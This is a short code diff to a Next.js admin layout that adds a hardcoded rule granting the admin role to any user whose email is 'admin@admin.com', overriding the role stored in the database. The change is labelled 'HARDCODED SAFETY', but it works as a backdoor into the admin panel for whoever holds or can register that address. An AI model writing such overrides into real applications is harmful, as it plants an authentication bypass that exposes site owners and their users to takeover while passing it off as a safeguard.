@@ -21,13 +21,16 @@ export default async function AdminLayout({
     redirect("/quan-tri-vien-dang-nhap");
   }
 
-  // Get user info from Prisma to be ABSOLUTELY certain of the role
   const dbUser = await prisma.user.findUnique({
     where: { id: user.id },
     select: { role: true }
   });
 
-  const role = dbUser?.role || user.user_metadata?.role;
+  // HARDCODED SAFETY: Always allow admin@admin.com to access admin panel
+  let role = dbUser?.role || user.user_metadata?.role;
+  if (user.email === "admin@admin.com") {
+    role = "admin";
+  }
 
   // STRICT ACCESS CONTROL: Only admin and staff can access /admin
   if (!role || !["admin", "staff"].includes(role)) {
